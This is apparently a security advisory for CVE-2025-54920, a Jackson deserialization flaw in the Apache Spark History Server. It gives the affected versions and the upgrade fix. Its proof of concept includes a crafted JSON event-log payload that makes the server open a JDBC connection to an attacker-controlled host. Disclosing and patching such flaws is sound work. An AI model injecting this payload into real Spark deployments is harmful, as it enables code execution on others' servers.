# Apache Spark: Spark History Server Code Execution Vulnerability

**GHSA**: GHSA-jwp6-cvj8-fw65 | **CVE**: CVE-2025-54920 | **Severity**: high (CVSS 8.8)

**CWE**: CWE-502

**Affected Packages**:
- **org.apache.spark:spark-core_2.13** (maven): >= 4.0.0, < 4.0.1
- **org.apache.spark:spark-core_2.13** (maven): < 3.5.7
- **org.apache.spark:spark-core_2.12** (maven): < 3.5.7
- **org.apache.spark:spark-core_2.11** (maven): <= 2.4.8
- **org.apache.spark:spark-core_2.10** (maven): <= 2.2.3
- **org.apache.spark:spark-core_2.9.3** (maven): <= 0.8.1-incubating

## Description

This issue affects Apache Spark: before 3.5.7 and 4.0.1. Users are recommended to upgrade to version 3.5.7 or 4.0.1 and above, which fixes the issue.

## Summary

Apache Spark 3.5.4 and earlier versions contain a code execution vulnerability in the Spark History Web UI due to overly permissive Jackson deserialization of event log data. This allows an attacker with access to the Spark event logs directory to inject malicious JSON payloads that trigger deserialization of arbitrary classes, enabling command execution on the host running the Spark History Server.

## Details

The vulnerability arises because the Spark History Server uses Jackson polymorphic deserialization with @JsonTypeInfo.Id.CLASS on SparkListenerEvent objects, allowing an attacker to specify arbitrary class names in the event JSON. This behavior permits instantiating unintended classes, such as org.apache.hive.jdbc.HiveConnection, which can perform network calls or other malicious actions during deserialization.

The attacker can exploit this by injecting crafted JSON content into the Spark event log files, which the History Server then deserializes on startup or when loading event logs. For example, the attacker can force the History Server to open a JDBC connection to a remote attacker-controlled server, demonstrating remote command injection capability.

## Proof of Concept:

1. Run Spark with event logging enabled, writing to a writable directory (spark-logs).

2. Inject the following JSON at the beginning of an event log file:

```
{

  "Event": "org.apache.hive.jdbc.HiveConnection",
  "uri": "jdbc:hive2://<IP>:<PORT>/",
  "info": {
    "hive.metastore.uris": "thrift://<IP>:<PORT>"
  }
}
```
3. Start the Spark History Server with logs pointing to the modified directory.

4. The Spark History Server initiates a JDBC connection to the attacker’s server, confirming the injection.

## Impact

An attacker with write access to Spark event logs can execute arbitrary code on the server running the History Server, potentially compromising the entire system.
